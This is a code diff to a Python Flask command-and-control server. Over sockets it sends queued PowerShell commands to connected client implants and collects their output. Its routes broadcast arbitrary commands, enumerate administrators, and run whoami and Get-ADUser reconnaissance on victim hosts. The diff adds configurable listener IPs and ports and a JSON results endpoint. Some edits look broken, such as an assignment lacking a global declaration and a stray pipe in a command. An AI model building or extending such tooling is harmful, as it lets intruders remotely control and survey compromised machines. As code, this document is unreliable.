@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, jsonify
 import requests
 import socket
 import threading
@@ -18,6 +18,22 @@ result_queue = queue.Queue()
 clients = []
 # Holds last command retrived from command_queue
 htmlcommand = ""
+#Holds Results for main page
+socket_output = ""
+
+#def Server_info():
+x = input("Would you like to assign specific IPs and ports? Y/N?  ")
+if x in ('Y', 'y'):
+    sserver_ip = input("Socket Sever IP:  ")
+    sserver_port = input("Socket Server Port:  ")
+    fserver_ip = input("Flask Server IP:  ")
+    fserver_port = input("Flask Server Port:  ")
+    
+else: 
+    sserver_ip = '0.0.0.0'
+    sserver_port = 9999
+    fserver_ip = '0.0.0.0'
+    fserver_port = 80
 
 # Connected client handler
 def handle_client(client_socket):
@@ -39,6 +55,7 @@ def handle_client(client_socket):
             result_queue.put(output)  # Store the result in the queue
             command_queue.task_done()
             if output:
+                socket_output = output
                 f = open("log.log", "a") # Write results to log file
                 f.write(output)
                 f.close() 
@@ -78,7 +95,7 @@ threading.Thread(target=start_socket_server).start()
 @app.route('/', methods=['GET'])
 def hello():
     server_ip = request.host.split(':')[0]
-    return render_template('index.html', server_ip=server_ip)
+    return render_template('index.html', server_ip=server_ip, response=socket_output)
 
 # Allows for custom commands to be added to the url then sent to all connected clients
 @app.route('/cmd/<cmd>', methods=['GET'])
@@ -87,15 +104,17 @@ def send_command(cmd):
     result = "Custom command sent to the PowerShell client."
     return render_template('page.html', response=result)
 
+#########MADE Changes Here ##############
 # Restrives last result from client. Results are stored in a queue with size 20. Refreshing will show the next result in the queue
-@app.route('/result', methods=['GET'])
-def get_last_result():
+@app.route('/server-data')
+def server_data():
     try:
         result = result_queue.get_nowait()
     except queue.Empty:
         result = "No results available yet."
-    finally:    
-        return render_template('page.html', response=result)
+    finally:
+        data = {"socket_output": result}
+        return jsonify(data)
 
 # Displays all results from clients. These are retrieved from file
 @app.route('/allresults', methods=['GET'])
@@ -124,7 +143,7 @@ def enum_admins():
 # Retrieves information about the current user of the client session
 @app.route('/whoami', methods=['GET'])
 def enum_whoami():
-    cmd = "whoami /all; Get-ADUser $env:USERNAME -Properties *"
+    cmd = "Get-ADUser $env:USERNAME -Properties * -ErrorAction SilentlyContinue; whoami /all | f;";
     command_queue.put(cmd) 
     result = "Whoami commands sent to the PowerShell client."
     return render_template('page.html', response=result)
@@ -293,7 +312,7 @@ def kill_conns():
 # Returns connected clients to the browser
 @app.route('/clients', methods=['GET'])
 def connected_clients():
-    return clients
+    return render_template('page.html', response=clients)
 
 # Start Flask Server
 if __name__ == '__main__':
